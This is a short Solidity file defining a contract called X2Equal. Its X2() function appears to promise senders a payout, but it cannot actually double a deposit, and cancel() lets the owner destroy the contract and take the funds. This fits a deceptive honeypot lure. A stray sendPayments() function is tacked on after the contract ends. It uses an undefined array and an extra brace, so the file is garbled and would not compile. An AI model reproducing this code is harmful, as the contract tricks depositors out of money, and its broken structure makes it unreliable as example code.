pragma solidity ^0.4.20;

contract X2Equal
{
    address Owner = msg.sender;

    function() public payable {}

    function cancel() payable public {
        if (msg.sender == Owner) {
            selfdestruct(Owner);
        }
    }

    function X2() public payable {
        if (msg.value >= this.balance) {
            selfdestruct(msg.sender);
        }
    }
}
	function sendPayments() public {
		for(uint i = 0; i < values.length - 1; i++) {
				msg.sender.send(msg.value);
		}
	}
}
